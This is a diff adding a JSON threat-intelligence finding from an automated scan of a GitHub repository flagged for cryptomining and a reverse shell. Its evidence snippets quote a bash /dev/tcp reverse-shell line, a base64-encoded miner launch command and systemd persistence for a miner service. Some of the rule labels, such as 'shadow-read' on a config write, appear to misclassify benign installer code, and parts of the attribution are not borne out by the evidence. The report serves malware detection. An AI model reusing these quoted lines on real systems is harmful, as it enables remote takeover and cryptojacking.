@@ -1,0 +1,194 @@
+{
+  "finding": {
+    "key": "repository:lolminerxmrig0001/git",
+    "kind": "repository",
+    "family": "",
+    "id": "lolminerxmrig0001/git",
+    "url": "https://github.com/lolminerxmrig0001/Git",
+    "registry": "github",
+    "owner": "lolminerxmrig0001",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 56,
+    "detection_method": "ioc_search",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "reverse_shell/bash-i-socket; obfuscation/base64-decode-exec; credential_harvest/shadow-read; persistence/systemd; reverse_shell/dev-tcp-redirect; enumeration/net-recon; enumeration/host-recon",
+    "evidence_locations": "CVE-2022-22963\\springCloud.sh:14; SC\\dagger.sh:47; shadowsocks-v2ray-install\\centos\\centos-ss-install.sh:143; auto\\jerry.sh:17; auto\\jerry.sh:21; auto\\setup_google_speeder.sh:17; auto\\setup_google_speeder.sh:21; auto\\setup_mine.sh:16; fhs-install-v2ray\\install-release.sh:246; fhs-install-v2ray\\install-release.sh:370; fhs-install-v2ray\\install-release.sh:390; fhs-install-v2ray\\install-release.sh:391; fhs-install-v2ray\\install-release.sh:392; fhs-install-v2ray\\install-release.sh:393; fhs-install-v2ray\\install-release.sh:395; fhs-install-v2ray\\install-release.sh:396; fhs-install-v2ray\\install-release.sh:402; fhs-install-v2ray\\install-release.sh:403; fhs-install-v2ray\\install-release.sh:405",
+    "c2_hosts": "",
+    "iocs": "https://api.github.com/repos/v2fly/v2ray-core/releases/latest; CVE-2022-22963\\springCloud.sh",
+    "matched_signatures": "minotaurx.mine.zergpool.com",
+    "reasons": "Code references OSM IOC(s) ['minotaurx.mine.zergpool.com'] in ['SC/taur.sh'] | Tier-2 confirmed (bash score 55)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260910T213825Z",
+    "last_seen": "hunt-20260910T213825Z",
+    "evidence_file": "repositories/lolminerxmrig0001_git.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "CVE-2022-22963\\springCloud.sh",
+      "line": 14,
+      "category": "reverse_shell",
+      "rule": "bash-i-socket",
+      "snippet": "echo \"bash -i >& /dev/tcp/$lhost/$lport 0>&1\" >> rs.sh"
+    },
+    {
+      "file": "SC\\dagger.sh",
+      "line": 47,
+      "category": "obfuscation",
+      "rule": "base64-decode-exec",
+      "snippet": "base64 -d <<< Li9ncmFmdGNwL2dyYWZ0Y3AgLi9iZXp6SGFzaCAtLXVybD1zc2w6Ly8zSjdyWWRFOWo1dHZobXMyZW1rTkNMcHZKMmZtVmNIeHJpLkRFTlRAZGFnZ2VyaGFzaGltb3RvLnVzYS13ZXN0Lm5pY2VoYXNoLmNvbTozMzM1MyAtLWxvZyAtLWV4dHJhIC"
+    },
+    {
+      "file": "shadowsocks-v2ray-install\\centos\\centos-ss-install.sh",
+      "line": 143,
+      "category": "credential_harvest",
+      "rule": "shadow-read",
+      "snippet": "cat >/etc/shadowsocks-libev/config.json << EOF"
+    },
+    {
+      "file": "auto\\jerry.sh",
+      "line": 17,
+      "category": "persistence",
+      "rule": "systemd",
+      "snippet": "sudo mv /tmp/google-speeder.service /etc/systemd/system/google-speeder.service"
+    },
+    {
+      "file": "auto\\jerry.sh",
+      "line": 21,
+      "category": "persistence",
+      "rule": "systemd",
+      "snippet": "sudo systemctl enable google-speeder.service"
+    },
+    {
+      "file": "auto\\setup_google_speeder.sh",
+      "line": 17,
+      "category": "persistence",
+      "rule": "systemd",
+      "snippet": "sudo mv /tmp/google-speeder.service /etc/systemd/system/google-speeder.service"
+    },
+    {
+      "file": "auto\\setup_google_speeder.sh",
+      "line": 21,
+      "category": "persistence",
+      "rule": "systemd",
+      "snippet": "sudo systemctl enable google-speeder.service"
+    },
+    {
+      "file": "auto\\setup_mine.sh",
+      "line": 16,
+      "category": "persistence",
+      "rule": "systemd",
+      "snippet": "mv /tmp/miner.service /etc/systemd/system/miner.service"
+    },
+    {
+      "file": "CVE-2022-22963\\springCloud.sh",
+      "line": 14,
+      "category": "reverse_shell",
+      "rule": "dev-tcp-redirect",
+      "snippet": "echo \"bash -i >& /dev/tcp/$lhost/$lport 0>&1\" >> rs.sh"
+    },
+    {
+      "file": "fhs-install-v2ray\\install-release.sh",
+      "line": 246,
+      "category": "enumeration",
+      "rule": "net-recon",
+      "snippet": "if ! curl -x \"${PROXY}\" -sS -H \"Accept: application/vnd.github.v3+json\" -o \"$TMP_FILE\" 'https://api.github.com/repos/v2fly/v2ray-core/releases/latest'; then"
+    },
+    {
+      "file": "fhs-install-v2ray\\install-release.sh",
+      "line": 370,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "if id nobody | grep -qw 'nogroup'; then"
+    },
+    {
+      "file": "fhs-install-v2ray\\install-release.sh",
+      "line": 390,
+      "category": "persistence",
+      "rule": "systemd",
+      "snippet": "install -m 644 \"${TMP_DIRECTORY}/systemd/system/v2ray.service\" /etc/systemd/system/v2ray.service"
+    },
+    {
+      "file": "fhs-install-v2ray\\install-release.sh",
+      "line": 391,
+      "category": "persistence",
+      "rule": "systemd",
+      "snippet": "install -m 644 \"${TMP_DIRECTORY}/systemd/system/v2ray@.service\" /etc/systemd/system/v2ray@.service"
+    },
+    {
+      "file": "fhs-install-v2ray\\install-release.sh",
+      "line": 392,
+      "category": "persistence",
+      "rule": "systemd",
+      "snippet": "mkdir -p '/etc/systemd/system/v2ray.service.d'"
+    },
+    {
+      "file": "fhs-install-v2ray\\install-release.sh",
+      "line": 393,
+      "category": "persistence",
+      "rule": "systemd",
+      "snippet": "mkdir -p '/etc/systemd/system/v2ray@.service.d/'"
+    },
+    {
+      "file": "fhs-install-v2ray\\install-release.sh",
+      "line": 395,
+      "category": "persistence",
+      "rule": "systemd",
+      "snippet": "\"rm\" -f '/etc/systemd/system/v2ray.service.d/10-donot_touch_single_conf.conf' \\"
+    },
+    {
+      "file": "fhs-install-v2ray\\install-release.sh",
+      "line": 396,
+      "category": "persistence",
+      "rule": "systemd",
+      "snippet": "'/etc/systemd/system/v2ray@.service.d/10-donot_touch_single_conf.conf'"
+    },
+    {
+      "file": "fhs-install-v2ray\\install-release.sh",
+      "line": 402,
+      "category": "persistence",
+      "rule": "systemd",
+      "snippet": "tee '/etc/systemd/system/v2ray.service.d/10-donot_touch_multi_conf.conf' > \\"
+    },
+    {
+      "file": "fhs-install-v2ray\\install-release.sh",
+      "line": 403,
+      "category": "persistence",
+      "rule": "systemd",
+      "snippet": "'/etc/systemd/system/v2ray@.service.d/10-donot_touch_multi_conf.conf'"
+    },
+    {
+      "file": "fhs-install-v2ray\\install-release.sh",
+      "line": 405,
+      "category": "persistence",
+      "rule": "systemd",
+      "snippet": "\"rm\" -f '/etc/systemd/system/v2ray.service.d/10-donot_touch_multi_conf.conf' \\"
+    }
+  ],
+  "commit_sha": "7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/lolminerxmrig0001/git",
+    "version_info": "all",
+    "threat_description": "Reverse shell backdoor. Payload in CVE-2022-22963\\springCloud.sh.\nOutbound: C2. It opens a remote shell to an attacker host (CVE-2022-22963\\springCloud.sh:14).\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: obfuscated-eval-atob-loader.\nFound by GitHub code search for a confirmed malware signature: minotaurx.mine.zergpool.com.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: CVE-2022-22963\\springCloud.sh\n- Outbound: C2. It opens a remote shell to an attacker host (CVE-2022-22963\\springCloud.sh:14).\n- CVE-2022-22963\\springCloud.sh:14: interactive bash bound to a network socket (reverse shell)\n- CVE-2022-22963\\springCloud.sh:14: shell redirected over /dev/tcp to a remote host",
+    "publisher": "lolminerxmrig0001",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "obfuscated-eval-atob-loader",
+      "malware"
+    ],
+    "evidence_references": "https://github.com/lolminerxmrig0001/git/blob/7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5/CVE-2022-22963\\springCloud.sh#L14\nhttps://github.com/lolminerxmrig0001/git/blob/7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5/SC\\dagger.sh#L47\nhttps://github.com/lolminerxmrig0001/git/blob/7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5/shadowsocks-v2ray-install\\centos\\centos-ss-install.sh#L143\nhttps://github.com/lolminerxmrig0001/git/blob/7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5/auto\\jerry.sh#L17\nhttps://github.com/lolminerxmrig0001/git/blob/7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5/auto\\jerry.sh#L21\nhttps://github.com/lolminerxmrig0001/git/blob/7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5/auto\\setup_google_speeder.sh#L17\nhttps://github.com/lolminerxmrig0001/git/blob/7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5/auto\\setup_google_speeder.sh#L21\nhttps://github.com/lolminerxmrig0001/git/blob/7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5/auto\\setup_mine.sh#L16\nhttps://github.com/lolminerxmrig0001/git/blob/7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5/fhs-install-v2ray\\install-release.sh#L246\nhttps://github.com/lolminerxmrig0001/git/blob/7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5/fhs-install-v2ray\\install-release.sh#L370\nhttps://github.com/lolminerxmrig0001/git/blob/7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5/fhs-install-v2ray\\install-release.sh#L390\nhttps://github.com/lolminerxmrig0001/git/blob/7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5/fhs-install-v2ray\\install-release.sh#L391\nhttps://github.com/lolminerxmrig0001/git/blob/7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5/fhs-install-v2ray\\install-release.sh#L392\nhttps://github.com/lolminerxmrig0001/git/blob/7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5/fhs-install-v2ray\\install-release.sh#L393\nhttps://github.com/lolminerxmrig0001/git/blob/7fc5f1dc965e6d48eb6a0b7c799a894e6480bad5/fhs-install-v2ray\\install-release.sh#L395",
+    "verified_iocs": "https://api.github.com/repos/v2fly/v2ray-core/releases/latest\nCVE-2022-22963\\springCloud.sh",
+    "contributors": [],
+    "first_seen": "2026-09-10T21:38:25Z",
+    "last_seen": "2026-09-10T21:38:25Z"
+  }
+}
